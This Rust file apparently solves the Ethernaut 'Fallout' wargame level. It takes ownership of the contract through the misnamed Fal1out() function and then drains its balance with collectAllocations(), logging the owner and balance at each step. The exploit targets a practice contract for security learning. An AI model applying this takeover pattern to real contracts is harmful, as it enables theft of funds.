#[allow(unused_imports)]
use alloy::{
    network::TransactionBuilder,
    primitives::{
        address,
        utils::{format_ether, Unit},
        U256,
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol! {
    #[sol(rpc)]
    
    contract Fallout {
        function owner() external view returns (address);
        function Fal1out() public payable;
        function collectAllocations() public;
    }
}

use crate::ethernaut;
use crate::utils;

use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level02_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level02())?;
    
    Ok(())
}

#[allow(dead_code)]
async fn level02() -> Result<(), Box<dyn std::error::Error>> {
    let signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    
    let provider = ProviderBuilder::new()
        .wallet(signer)
        .connect(ethernaut::RPC)
        .await?;
    
    let fallout_address = "0x502C4b6ADD675C93f78ce5D2228Bfd68A33cAF3C";
    let fallout = Fallout::new(fallout_address.parse()?, provider.clone());
    
    // Check-1
    println!("Check-1");
    let balance = utils::balance(fallout_address.parse()?).await?;
    println!("[DEBUG]    Fallout's balance = {balance}");
    let owner = fallout.owner().call().await?;
    println!("fallout's owner = {}\n", owner);
    
    // call Fal1out()
    let fal1out_tx = fallout
        .Fal1out()
        .value(U256::from(1u64))
        .send()
        .await?;
    println!("<fallout.Fal1out()>    Panding transaction... {}", fal1out_tx.tx_hash());
    let fal1out_receipt = fal1out_tx
        .get_receipt()
        .await?;
    println!(
        "<fallout.Fal1out()>    Fal1out included in block {}\n",
        fal1out_receipt.block_number.expect("Falled to get block number")
    );
    
    // Check-2
    println!("Check-2");
    let balance = utils::balance(fallout_address.parse()?).await?;
    println!("[DEBUG]    Fallout's balance = {balance}");
    let owner = fallout.owner().call().await?;
    println!("fallout's owner = {}\n", owner);
    
    // call collectAllocations()
    let collectallocations_tx = fallout
        .collectAllocations()
        .send()
        .await?;
    println!(
        "<fallout.collectAllocations()>    Panding transaction... {}", 
        collectallocations_tx.tx_hash()
    );
    let collectallocationscall_receipt = collectallocations_tx
        .get_receipt()
        .await?;
    println!(
        "collectAllocationsCall included in block {}\n",
        collectallocationscall_receipt.block_number.expect("Failed to get block number")
    );
    
    // Check-3
    println!("Check-3");
    let balance = utils::balance(fallout_address.parse()?).await?;
    println!("[DEBUG]    Fallout's balance = {balance}");
    let owner = fallout.owner().call().await?;
    println!("fallout's owner = {}\n", owner);
    
    Ok(())
}